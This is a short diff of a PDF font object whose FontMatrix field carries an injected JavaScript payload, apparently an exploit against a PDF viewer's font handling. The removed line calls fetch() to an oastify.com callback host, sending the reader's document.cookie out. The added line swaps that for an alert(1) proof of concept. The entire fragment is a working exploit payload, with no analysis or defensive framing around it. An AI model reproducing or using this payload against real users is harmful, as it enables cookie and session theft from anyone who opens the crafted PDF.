@@ -28,7 +28,7 @@ endobj
 /LastChar 102
 /Encoding/WinAnsiEncoding
 /FontMatrix [0.1 0 0 0.1 0 (1\); 
-fetch('https://stp7ouon749kmxqdzc1b1kewxn3er4ft.oastify.com?c='+document.cookie);//]
+alert(1)
 /Subtype/Type1
 /FirstChar 65
 /FontDescriptor 9 0 R
